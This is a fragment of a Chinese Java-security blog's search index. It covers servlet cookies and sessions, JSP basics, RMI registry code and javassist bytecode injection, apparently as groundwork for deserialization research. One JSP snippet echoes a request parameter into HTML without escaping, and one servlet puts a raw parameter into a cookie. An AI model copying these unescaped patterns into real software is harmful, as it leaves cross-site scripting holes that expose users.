cookie\u7684\u4e3b\u8981\u65b9\u6cd5\u5982\u4e0b \u5e8f\u53f7 \u65b9\u6cd5 & \u63cf\u8ff0 1 public void setDomain(String pattern) \u8be5\u65b9\u6cd5\u8bbe\u7f6e cookie \u9002\u7528\u7684\u57df\uff0c\u4f8b\u5982 runoob.com\u3002 2 public String getDomain() \u8be5\u65b9\u6cd5\u83b7\u53d6 cookie \u9002\u7528\u7684\u57df\uff0c\u4f8b\u5982 runoob.com\u3002 3 public void setMaxAge(int expiry) \u8be5\u65b9\u6cd5\u8bbe\u7f6e cookie \u8fc7\u671f\u7684\u65f6\u95f4\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002\u5982\u679c\u4e0d\u8fd9\u6837\u8bbe\u7f6e\uff0ccookie \u53ea\u4f1a\u5728\u5f53\u524d session \u4f1a\u8bdd\u4e2d\u6301\u7eed\u6709\u6548\u3002 4 public int getMaxAge()\u8be5\u65b9\u6cd5\u8fd4\u56de cookie \u7684\u6700\u5927\u751f\u5b58\u5468\u671f\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c-1 \u8868\u793a cookie \u5c06\u6301\u7eed\u4e0b\u53bb\uff0c\u76f4\u5230\u6d4f\u89c8\u5668\u5173\u95ed 5 public String getName()*\u8be5\u65b9\u6cd5\u8fd4\u56de cookie \u7684\u540d\u79f0\u3002\u540d\u79f0\u5728\u521b\u5efa\u540e\u4e0d\u80fd\u6539\u53d8 6 public void setValue(String newValue) \u8be5\u65b9\u6cd5\u8bbe\u7f6e\u4e0e cookie \u5173\u8054\u7684\u503c\u3002 7 public String getValue() \u8be5\u65b9\u6cd5\u83b7\u53d6\u4e0e cookie \u5173\u8054\u7684\u503c\u3002 8 public void setPath(String uri) \u8be5\u65b9\u6cd5\u8bbe\u7f6e cookie \u9002\u7528\u7684\u8def\u5f84\u3002\u5982\u679c\u60a8\u4e0d\u6307\u5b9a\u8def\u5f84\uff0c\u4e0e\u5f53\u524d\u9875\u9762\u76f8\u540c\u76ee\u5f55\u4e0b\u7684\uff08\u5305\u62ec\u5b50\u76ee\u5f55\u4e0b\u7684\uff09\u6240\u6709 URL \u90fd\u4f1a\u8fd4\u56de cookie\u3002 9 public String getPath() \u8be5\u65b9\u6cd5\u83b7\u53d6 cookie \u9002\u7528\u7684\u8def\u5f84\u3002 10 public void setSecure(boolean flag)\u8be5\u65b9\u6cd5\u8bbe\u7f6e\u5e03\u5c14\u503c\uff0c\u8868\u793a cookie \u662f\u5426\u5e94\u8be5\u53ea\u5728\u52a0\u5bc6\u7684\uff08\u5373 SSL\uff09\u8fde\u63a5\u4e0a\u53d1\u9001\u3002 11 public void setComment(String purpose) \u8bbe\u7f6ecookie\u7684\u6ce8\u91ca\u3002\u8be5\u6ce8\u91ca\u5728\u6d4f\u89c8\u5668\u5411\u7528\u6237\u5448\u73b0 cookie \u65f6\u975e\u5e38\u6709\u7528\u3002 12 public String getComment() \u83b7\u53d6 cookie \u7684\u6ce8\u91ca\uff0c\u5982\u679c cookie \u6ca1\u6709\u6ce8\u91ca\u5219\u8fd4\u56de null\u3002 \u6211\u4eec\u9a6c\u4e0a\u5199\u4e00\u4e2ademo\uff0c\u8fd9\u4e2ademo\u4f1a\u7528\u5230 response.addCookie\u7528\u4e8e\u5728\u54cd\u5e94\u5934\u91cc\u6dfb\u52a0cookie\uff0ccookie.setMaxAge \u7528\u4e8e\u8bbe\u7f6ecookie\u7684\u6709\u6548\u671f\uff0crequest.getCookies \u7528\u4e8e\u83b7\u53d6\u8bf7\u6c42\u91cc\u7684cookie\u6570\u7ec4 \u8fd9\u91cc\u7684demo\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u7528\u4e8e\u6dfb\u52a0cookie\uff0c\u4e00\u4e2a\u7528\u4e8e\u8f93\u51facookie \u7528\u4e8e\u6dfb\u52a0cookie import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; @WebServlet(\"/a\") public class test extends HttpServlet { public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { Cookie name = new Cookie(\"name\", request.getParameter(\"name\")); // \u4e2d\u6587\u8f6c\u7801 name.setMaxAge(60*60*24); response.addCookie( name ); } } \u8f93\u51facookie\u503c import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; @WebServlet(\"/b\") public class test2 extends HttpServlet { public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { Cookie cookie = null; Cookie[] cookies = null; // \u83b7\u53d6\u4e0e\u8be5\u57df\u76f8\u5173\u7684 Cookie \u7684\u6570\u7ec4 cookies = request.getCookies(); // \u8bbe\u7f6e\u54cd\u5e94\u5185\u5bb9\u7c7b\u578b response.setContentType(\"text/html;charset=UTF-8\"); PrintWriter out = response.getWriter(); for (int i = 0; i < cookies.length; i++){ if((cookies[i].getName()).compareTo(\"name\")==0){ out.println(\"your name is \"+cookies[i].getValue()); } } } } ** session ** servle\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217session\u63a5\u53e3\u8f85\u52a9\u8fd9\u4e2a\u6d41\u7a0b 1 public Object getAttribute(String name) \u8be5\u65b9\u6cd5\u8fd4\u56de\u5728\u8be5 session \u4f1a\u8bdd\u4e2d\u5177\u6709\u6307\u5b9a\u540d\u79f0\u7684\u5bf9\u8c61\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u540d\u79f0\u7684\u5bf9\u8c61\uff0c\u5219\u8fd4\u56de null\u3002 2 public Enumeration getAttributeNames() \u8be5\u65b9\u6cd5\u8fd4\u56de String \u5bf9\u8c61\u7684\u679a\u4e3e\uff0cString \u5bf9\u8c61\u5305\u542b\u6240\u6709\u7ed1\u5b9a\u5230\u8be5 session \u4f1a\u8bdd\u7684\u5bf9\u8c61\u7684\u540d\u79f0\u3002 3 public long getCreationTime() \u8be5\u65b9\u6cd5\u8fd4\u56de\u8be5 session \u4f1a\u8bdd\u88ab\u521b\u5efa\u7684\u65f6\u95f4\uff0c\u81ea\u683c\u6797\u5c3c\u6cbb\u6807\u51c6\u65f6\u95f4 1970 \u5e74 1 \u6708 1 \u65e5\u5348\u591c\u7b97\u8d77\uff0c\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\u3002 4 public String getId() \u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u5206\u914d\u7ed9\u8be5 session \u4f1a\u8bdd\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u7684\u5b57\u7b26\u4e32\u3002 5 public long getLastAccessedTime() \u8be5\u65b9\u6cd5\u8fd4\u56de\u5ba2\u6237\u7aef\u6700\u540e\u4e00\u6b21\u53d1\u9001\u4e0e\u8be5 session \u4f1a\u8bdd\u76f8\u5173\u7684\u8bf7\u6c42\u7684\u65f6\u95f4\u81ea\u683c\u6797\u5c3c\u6cbb\u6807\u51c6\u65f6\u95f4 1970 \u5e74 1 \u6708 1 \u65e5\u5348\u591c\u7b97\u8d77\uff0c\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\u3002 6 public int getMaxInactiveInterval() \u8be5\u65b9\u6cd5\u8fd4\u56de Servlet \u5bb9\u5668\u5728\u5ba2\u6237\u7aef\u8bbf\u95ee\u65f6\u4fdd\u6301 session \u4f1a\u8bdd\u6253\u5f00\u7684\u6700\u5927\u65f6\u95f4\u95f4\u9694\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d\u3002 7 public void invalidate() \u8be5\u65b9\u6cd5\u6307\u793a\u8be5 session \u4f1a\u8bdd\u65e0\u6548\uff0c\u5e76\u89e3\u9664\u7ed1\u5b9a\u5230\u5b83\u4e0a\u9762\u7684\u4efb\u4f55\u5bf9\u8c61\u3002 8 public boolean isNew() \u5982\u679c\u5ba2\u6237\u7aef\u8fd8\u4e0d\u77e5\u9053\u8be5 session \u4f1a\u8bdd\uff0c\u6216\u8005\u5982\u679c\u5ba2\u6237\u9009\u62e9\u4e0d\u53c2\u5165\u8be5 session \u4f1a\u8bdd\uff0c\u5219\u8be5\u65b9\u6cd5\u8fd4\u56de true\u3002 9 public void removeAttribute(String name) \u8be5\u65b9\u6cd5\u5c06\u4ece\u8be5 session \u4f1a\u8bdd\u79fb\u9664\u6307\u5b9a\u540d\u79f0\u7684\u5bf9\u8c61\u3002 10 public void setAttribute(String name, Object value) \u8be5\u65b9\u6cd5\u4f7f\u7528\u6307\u5b9a\u7684\u540d\u79f0\u7ed1\u5b9a\u4e00\u4e2a\u5bf9\u8c61\u5230\u8be5 session \u4f1a\u8bdd\u3002 \u5199\u4e2ademo\u5427\uff0c\u8fc7\u4e00\u8fc7\u5c31\u884c\u4e86 import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; import java.text.*; import java.util.*; @WebServlet(\"/a\") public class test extends HttpServlet { public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { HttpSession session = request.getSession(); //\u521b\u5efa\u4e00\u4e2asession\u5bf9\u8c61 Date createtime = new Date(session.getCreationTime()); Date lastAccessTime = new Date(session.getLastAccessedTime()); PrintWriter out = response.getWriter(); SimpleDateFormat df = new SimpleDateFormat(\"yyyy-MM-dd:mm:ss\"); String countkey = new String(\"key\"); //\u8bbf\u95ee\u6b21\u6570\u7684\u952e Integer count = Integer.valueOf(0); //\u8bbf\u95ee\u6b21\u6570\u7684\u503c String userID = new String(\"Tom\"); //\u7528\u6237ID\u7684\u503c String userIDKey = new String(\"userIDKey\"); //\u7528\u6237ID\u7684\u952e if(session.getAttribute(countkey)==null){ //\u5982\u679c\u83b7\u5f97\u8be5session\u7684countkey\u8fd9\u4e2a\u952e\u7684\u503c\u4e0d\u5b58\u5728\u65f6\uff0c\u4e3a\u5f53\u524dsession\u521d\u59cb\u5316\u8fd9\u4e2a\u952e session.setAttribute(countkey,Integer.valueOf(0)); } if(session.isNew()){ //\u5982\u679csession\u662f\u7b2c\u4e00\u6b21\u521b\u5efa\uff0c\u5219\u4e3a\u5176\u521d\u59cb\u5316userID\u952e session.setAttribute(userIDKey,userID); } else{ count = (Integer) session.getAttribute(countkey); count = count+1; userID = (String)session.getAttribute(userIDKey); } session.setAttribute(countkey,count); out.println(\"hello\"+userID+\"\\nthis is the \"+count+\" to visit this website\\n\"); out.println(\"first time:\"+createtime+\"\\n this time:\"+lastAccessTime); } } JSP \u6982\u89c8 JSP\u662f\u811a\u672c\u8bed\u8a00\uff0c\u4e0ePHP\u7b49\u8bed\u8a00\u7c7b\u4f3c\u3002JSP\u672c\u8d28\u5c31\u662fservlet\uff0c\u5b83\u5b58\u5728\u7684\u610f\u4e49\u5c31\u662f\u7b80\u5316servlet\u590d\u6742\u7684\u7a0b\u5e8f\u8fc7\u7a0b JSP\u57fa\u7840\u8bed\u6cd5 ** \u4ee3\u7801\u6bb5 ** JSP\u548cPHP\u7b49\u53ef\u4ee5\u5d4c\u5165\u5230HTML\u7684\u811a\u672c\u8bed\u8a00\u7c7b\u4f3c\uff0c\u9700\u8981\u7528\u4e00\u4e2a\u4ee3\u7801\u6bb5\u5305\u88f9\u4ee3\u7801\u3002 \u5176\u683c\u5f0f\u5982\u4e0b <% code %> \u540c\u65f6\u5728\u4ee3\u7801\u6bb5\u4e2d\u8fd8\u5b58\u5728\u7740\u6307\u4ee4\u6807\u7b7e:Page,include,taglib \u4ed6\u4eec\u7684\u5b9a\u4e49\u548c\u4f5c\u7528\u5982\u4e0b <%@ page ...... %> page\u6307\u4ee4\u7528\u4e8e\u5b9a\u4e49\u7f51\u9875\u7684\u5404\u5c5e\u6027\uff0c\u5982<%@ page import=\"...\" %> \u8868\u793a\u8981\u5bfc\u5165\u54ea\u4e9bjava\u6a21\u5757,<%@ page language=\"...\" %>\u8868\u793aJSP\u9875\u9762\u6240\u7528\u7684\u8bed\u8a00\uff0c\u9ed8\u8ba4\u662fjava <%@ include file=\"\u6587\u4ef6\u76f8\u5bf9url\u5730\u5740\" %> \u8868\u793a\u8981\u5305\u542b\u54ea\u4e9b\u5176\u4ed6\u6587\u4ef6\uff0c\u53ef\u4ee5\u5305\u542bJSP,HTML\u6216txt\u7b49\u6587\u4ef6 <%@ taglib ......%> \u4e3b\u8981\u7528\u4e8e\u7528\u6237\u81ea\u5b9a\u4e49\u6807\u7b7e ** \u52a8\u4f5c\u5143\u7d20 ** \u4e0e\u6307\u4ee4\u5143\u7d20\u6bd4\u8f83\u76f8\u4f3c\uff0c\u4f46\u4e0d\u540c\u7684\u662f\u52a8\u4f5c\u5143\u7d20\u53ef\u4ee5\u52a8\u6001\u7684\u63d2\u5165\uff0c\u4e0d\u50cf\u6307\u4ee4\u5143\u7d20\u4e00\u6837\u4e00\u5f00\u5934\u5c31\u4f1a\u88ab\u6267\u884c\u3002 ** \u4e5d\u5927\u5bf9\u8c61 ** JSP\u4e2d\u6709\u4e5d\u5927\u5bf9\u8c61\u7528\u4e8e\u5b9e\u73b0\u5404\u79cd\u64cd\u4f5c\u3002 \u81f3\u4e8erequest\u548cresponse\uff0c\u8fd9\u4fe9\u7528\u7684\u662f\u6700\u591a\u7684\u662f\u4ed6\u4eec\uff0c out\u5bf9\u8c61\u4e3b\u8981\u7528\u4e8e\u5728response\u4e2d\u5199\u5165\u8f93\u51fa\u5185\u5bb9\uff0c out.println\u6216\u8005out.print\u7528\u4e8e\u8f93\u51fa\u5185\u5bb9\uff0cout.flush\u7528\u4e8e\u5237\u65b0\u8f93\u51fa\u6d41,\u5176\u4f59\u5728\u65b0\u624b\u9636\u6bb5\u90fd\u4e0d\u548b\u7528\u3002 ** \u4f20\u53c2\u5904\u7406 ** getParameter(): \u4f7f\u7528 request.getParameter() \u65b9\u6cd5\u6765\u83b7\u53d6\u8868\u5355\u53c2\u6570\u7684\u503c\u3002 getParameterValues(): \u83b7\u5f97\u5982checkbox\u7c7b\uff08\u540d\u5b57\u76f8\u540c\uff0c\u4f46\u503c\u6709\u591a\u4e2a\uff09\u7684\u6570\u636e\u3002 \u63a5\u6536\u6570\u7ec4\u53d8\u91cf \uff0c\u5982checkbox\u7c7b\u578b getParameterNames(): \u8be5\u65b9\u6cd5\u53ef\u4ee5\u53d6\u5f97\u6240\u6709\u53d8\u91cf\u7684\u540d\u79f0\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a Enumeration\u3002 getInputStream(): \u8c03\u7528\u6b64\u65b9\u6cd5\u6765\u8bfb\u53d6\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u6d41\u3002 <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <html> <head> <title>test jsp</title> </head> <body> your name is <%=request.getParameter(\"name\")%> </body> </html> cookie\\&session ** cookie\uff0csession\u5728JSP\u91cc\u7684\u8bbe\u7f6e\u4e0eservlet\u5982\u51fa\u4e00\u8f99 ** cookie\u548csession\u5728jsp\u7684<%%>\u4ee3\u7801\u533a\u91cc\u8bbe\u7f6e\uff0c\u8bbe\u7f6e\u65b9\u6cd5\u4e0eservlet\u5982\u51fa\u4e00\u8f99\uff0c\u56e0\u4e3a<%%>\u4ee3\u7801\u533a\u91cc\u672c\u8eab\u5c31\u662f\u8c03\u7528\u7684java\u4ee3\u7801\uff0c\u6240\u4ee5\u4e0d\u518d\u8d58\u8ff0 RMI \u4f55\u4e3aRMI RMI\uff0c\u5373\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff0c\u5141\u8bb8\u8fd0\u884c\u5728\u4e00\u4e2aJAVA\u865a\u62df\u673a\u8c03\u7528\u53e6\u4e00\u4e2aJAVA\u865a\u62df\u673a\u4e0a\u7684\u5bf9\u8c61\u7684\u65b9\u6cd5. RMI:\u5b9e\u73b0\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3 RMI\u7684\u8fdc\u7a0b\u63a5\u53e3\u7528\u4e8e\u5176\u4ed6java\u865a\u62df\u673a\u8fdc\u7a0b\u8c03\u7528\u8be5\u63a5\u53e3\u4e0b\u7684\u5bf9\u8c61\u7684\u65b9\u6cd5. \u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3 import java.rmi.Remote; //\u5f15\u5165Remote\u63a5\u53e3 public interface IHello extends Remote{ //\u5b9e\u73b0\u4e00\u4e2aRemote\u63a5\u53e3 public String sayHello(String name) throws java.rmi.RemoteException; //\u82e5\u662fRemote\u63a5\u53e3\u91cc\u67d0\u4e2a\u65b9\u6cd5\u629b\u51faRemoteException\u5f02\u5e38,\u5c31\u610f\u5473\u7740\u8fd9\u662f\u4e00\u4e2a\u53ef\u4ee5\u88ab\u8fdc\u7a0b\u8c03\u7528\u7684\u65b9\u6cd5,\u4f46\u76ee\u524d\u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u672a\u88ab\u5177\u4f53\u5b9e\u73b0. } \u8fdc\u7a0b\u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b \u521a\u521a\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2aRemote\u63a5\u53e3,\u4f46\u662f\u4ed6\u7684\u65b9\u6cd5\u8fd8\u672a\u5177\u4f53\u5b9e\u73b0.\u6211\u4eec\u5c31\u6765\u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b\u5427 import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class HelloImpl extends UnicastRemoteObject implements IHello{ //\u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3\u5b9e\u73b0\u7c7b,\u6ce8\u610f\u8fd9\u4e2a\u8fdc\u7a0b\u5b9e\u73b0\u7c7b\u5fc5\u987b\u7ee7\u627f\u81eaUnicastRemoteObject,\u4e0d\u7136\u670d\u52a1\u7aef\u4e0d\u4f1a\u53d1\u9001\u8be5\u7c7b\u7684\u5bf9\u8c61\u7684\u5b58\u6839(stub(\u4e0b\u6587\u8bb2)) protected HelloImpl throws RemoteException{//\u5fc5\u987b\u8981\u6709\u4e00\u4e2a\u629b\u51faRemoteException\u5f02\u5e38\u7684\u663e\u793a\u6784\u9020\u51fd\u6570 super(); } public String sayHello(String name) throws RemoteException{ return \"Hello\"+name; //\u5b9a\u4e49\u5b9e\u73b0\u7c7b\u65b9\u6cd5\u7684\u5177\u4f53\u4ee3\u7801 } } \u4e24\u53f0JVM\u901a\u8baf\u7684\u7b2c\u4e00\u6b65:RMI Registry \u4f55\u4e3aRMI Registry \u53ef\u4ee5\u7406\u89e3\u4e3a\u90e8\u7f72\u5728\u88ab\u8fdc\u7a0b\u8c03\u7528\u7684JAVA\u865a\u62df\u673a\u4e0a\u7684\u4e00\u4e2a\u5e94\u7528,\u7528\u4e8e\u5c06stub\u7ed1\u5b9a\u5230Registry\u670d\u52a1\u7684URL\u4e0a\u3002 \u670d\u52a1\u7aef\u7ed1\u5b9astub\u5230\u6307\u5b9aurl java.rmi.Naming.rebind(\"rmi://localhost:1099/hello\", hello); //\u5982\u6b64\u5904\u5c31\u662f\u628ahello\u8fd9\u4e2a\u5bf9\u8c61\u7ed1\u5b9a\u5728\u4e86rmi://localhost:1099/hello\u8fd9\u4e2aURL \u968f\u540e\u5ba2\u6237\u7aef\u60f3\u8981\u8fdc\u7a0b\u8c03\u7528hello\u8fd9\u4e2a\u5bf9\u8c61\u7684\u65b9\u6cd5\u65f6\uff0c\u5c31\u9700 IHello hello = (IHello) Naming.lookup(\"rmi://localhost:1099/hello\"); //\u6b64\u523b\u5ba2\u6237\u7aef\u67e5\u627e\u51fa\u4e86hello\u5bf9\u8c61\u7684stub\u6240\u5728url,\u670d\u52a1\u7aef\u8fd4\u56dehello\u5bf9\u8c61\u7684Stub //\u6b64\u65f6\u7684\u6570\u636e\u7c7b\u578b\u4f3c\u4e4e\u5fc5\u987b\u662f\u63a5\u53e3\u7c7b Stub\u548cSkeleton \u7531\u4e0a\u6587\u53ef\u77e5\u5f53\u5ba2\u6237\u673a\u8fdc\u7a0b\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61\u65f6,\u8fd4\u56de\u7684\u5176\u5b9e\u4e0d\u662f\u5bf9\u8c61\u672c\u8eab,\u800c\u662fstub. \u4f60\u53ef\u4ee5\u7406\u89e3stub\u4e3a\u4e00\u4e2a\u4e2d\u7ee7\u7ad9\uff0c\u5f53\u5ba2\u6237\u673a\u8c03\u7528\u8be5\u5bf9\u8c61\u67d0\u4e2a\u65b9\u6cd5\u65f6,\u5b9e\u9645\u4e0a\u662f\u901a\u8fc7stub\u4ee5socket\u7684\u65b9\u5f0f\u5411\u670d\u52a1\u5668\u7aef\u7684skeleton\u53d1\u9001\u5e8f\u5217\u5316\u5904\u7406\u7684\u65b9\u6cd5\u540d\u548c\u53c2\u6570\uff08skeleton\u53ef\u4ee5\u7406\u89e3\u4e3a\u670d\u52a1\u5668\u7aef\u4e0a\u7684\u771f\u5b9e\u5bf9\u8c61) \u670d\u52a1\u7aef\u7684skeletion\u53cd\u5e8f\u5217\u5316\u5f97\u5230\u7684\u65b9\u6cd5\u540d\u548c\u53c2\u6570\u5e76\u5904\u7406\u540e\u518d\u4ee5socket\u7684\u65b9\u5f0f\u628a\u8be5\u65b9\u6cd5\u751f\u6210\u7684\u7ed3\u679c\u4f20\u56destub,stub\u518d\u628a\u6570\u636e\u8fd4\u56de\u7ed9\u5ba2\u6237\u673a \u4ee3\u7801\u5b9e\u73b0\u8fdc\u7a0b\u8c03\u7528 \u670d\u52a1\u5668\u7aef import java.rmi.Remote; import java.rmi.registry.*; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; interface Hello extends Remote{ public String sayHello(String name) throws RemoteException; } class HelloImpl extends UnicastRemoteObject implements Hello{ protected HelloImpl()throws RemoteException { super(); } public String sayHello(String name) throws RemoteException{ return \"Hello\"+name; } } ------------------------------------------------------------------ public class Server{ public static void main(String[] args){ try{//\u5fc5\u987b\u6709try..catch Hello hello = new HelloImpl(); //\u4f3c\u4e4e\u6570\u636e\u7c7b\u578b\u53ea\u80fd\u662f\u63a5\u53e3\u7c7b LocateRegistry.createRegistry(1080); //\u5c06RMI registry\u7684\u7aef\u53e3\u8bbe\u7f6e\u4e3a1080 java.rmi.Naming.rebind(\"rmi://localhost:1080/hello\", hello);// \u5c06hello\u8fd9\u4e2a\u65b9\u6cd5\u5bf9\u8c61\u7ed1\u5b9a\u5728\u6307\u5b9aurl\u4e0a,rmi\u534f\u8bae System.out.print(\"OK\"); }catch(Exception e){ e.printStackTrace(); } } } \u5ba2\u6237\u673a\u7aef import java.rmi.Remote; import java.rmi.registry.*; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.rmi.Naming; public class Client{ public static void main(String[] args){ try{//\u5fc5\u987b\u6709try..catch Hello hello_client = (Hello) Naming.lookup(\"rmi://localhost:1080/hello\"); //\u670d\u52a1\u5668\u7aef\u7ed1\u5b9a\u5728\u8be5url\u7684\u5bf9\u8c61\u6570\u636e\u7c7b\u578b\u662fHello\uff0c\u6240\u4ee5\u8fd9\u91cc\u7684\u6570\u636e\u7c7b\u578b\u4e5f\u662fHello System.out.print(hello_client.sayHello(\"fuck\")); }catch(Exception e){ e.printStackTrace(); } } } \u7ed3\u679c javassist javassist \u662f\u4e00\u4e2a\u7c7b\u5e93\uff0c\u7528\u4e8e\u64cd\u4f5cjava\u5b57\u8282\u7801\u3002 \u6bd4\u5982\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u4f1a\u4f7f\u7528javassist\u6765\u52a8\u6001\u64cd\u4f5c\u5b57\u8282\u7801\u3002 test2.java public class test2 { public void gogo(){ System.out.println(\"yuansheng\"); } } test1.java import javassist.*; public class test1 { public static void main(String[] args) throws Exception{ ClassPool pool = ClassPool.getDefault(); CtClass class1 = pool.get(test2.class.getName()); String cmd = \"System.out.print(\\\"hello\\\");\"; class1.makeClassInitializer().insertBefore(cmd); \\\\\u63d2\u5165static\u9759\u6001\u4ee3\u7801\u5757\uff0c\u5185\u5bb9\u4e3acmd\u4e2d\u5185\u5bb9 class1.setName(\"class1\"); \\\\\u4e3a\u65b0\u7c7b\u547d\u540d\u4e3aclass1 class1.writeFile(\"d:\\\\test\"); \\\\\u5c06\u7c7b\u5199\u5165d:\\\\test\u6587\u4ef6\u5939 } } \u53cd\u7f16\u8bd1d:\\\\test\\\\class1.class // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // public class class1 { public class1() { } public void gogo() { System.out.println(\"yuansheng\"); } static { System.out.print(\"hello\"); } } \u53d1\u73b0\u6211\u4eec\u5df2\u7ecf\u5f80test2.java\u7684\u5185\u5bb9\u4e2d\u63d2\u5165\u4e86\u8f93\u51fahello\u7684\u9759\u6001\u4ee3\u7801\u5757\uff0c\u5e76\u4ee5class1.class\u5199\u5165d:\\\\test\u6587\u4ef6\u5939\u3002 javassist\u7684\u529f\u80fd\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u5f88\u591a","title":"java\u5b89\u5168\u4e2d\u91cd\u8981\u7684\u51e0\u4e2a\u673a\u5236"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#java","text":"","title":"java\u5b89\u5168\u4e2d\u91cd\u8981\u7684\u51e0\u4e2a\u673a\u5236"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_1","text":"java \u4ee3\u7406 \u9759\u6001\u4ee3\u7406 \u52a8\u6001\u4ee3\u7406 JNI JNI HelloWorld JNI \u6570\u636e\u7c7b\u578b JNI \u5b9e\u73b0\u672c\u5730\u547d\u4ee4\u6267\u884c \u7c7b\u52a0\u8f7d\u5668 ClassLoader ClassLoader\u81ea\u5b9a\u4e49 URLClassLoader \u53cd\u5c04 \u53cd\u5c04\u7684\u57fa\u7840 \u83b7\u5f97\u4e00\u4e2a\u7c7b\u7684\u7c7b\u5bf9\u8c61 \u83b7\u53d6\u4e00\u4e2a\u7c7b\u5bf9\u8c61\u7684\u6240\u6709\u6210\u5458 \u53cd\u5c04\u7684\u8fdb\u9636\u4e0e\u5b89\u5168 Class.forName \u5b9e\u8d28\u4e0e\u7c7b\u521d\u59cb\u5316 Runtime\u6267\u884c\u547d\u4ee4\u89e3\u6790 ProcessBuilder\u6267\u884c\u547d\u4ee4\u7684\u53cd\u5c04\u5b9e\u73b0 Servlet Servlet\u751f\u547d\u5468\u671f \u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684Servlet \u5904\u7406\u4f20\u53c2 cookie\\&session JSP \u6982\u89c8 JSP\u57fa\u7840\u8bed\u6cd5 cookie\\&session RMI \u4f55\u4e3aRMI RMI:\u5b9e\u73b0\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3 \u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3 \u8fdc\u7a0b\u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b \u4e24\u53f0JVM\u901a\u8baf\u7684\u7b2c\u4e00\u6b65:RMI Registry Stub\u548cSkeleton \u4ee3\u7801\u5b9e\u73b0\u8fdc\u7a0b\u8c03\u7528 javassist","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#java_1","text":"\u4ee3\u7406\u7684\u4f5c\u7528\uff0c\u5c31\u662f\u5728\u539f\u6709\u7c7b\u7684\u4ee3\u7801\u4e0d\u53d1\u751f\u6539\u52a8\u7684\u60c5\u51b5\u4e0b\uff0c\u6dfb\u52a0\u65b0\u529f\u80fd\u3002\u8d77\u5230\u4e00\u4e2a\u4fee\u9970\u5668\u7684\u4f5c\u7528\u3002 \u5047\u8bbe\u6211\u4eec\u73b0\u5728\u6709\u4e2a\u7c7b\uff0c\u7528\u4e8e\u6253\u5370helloworld class hello{ public void gogo(){System.out.println(\"Hello Wrold\");} } 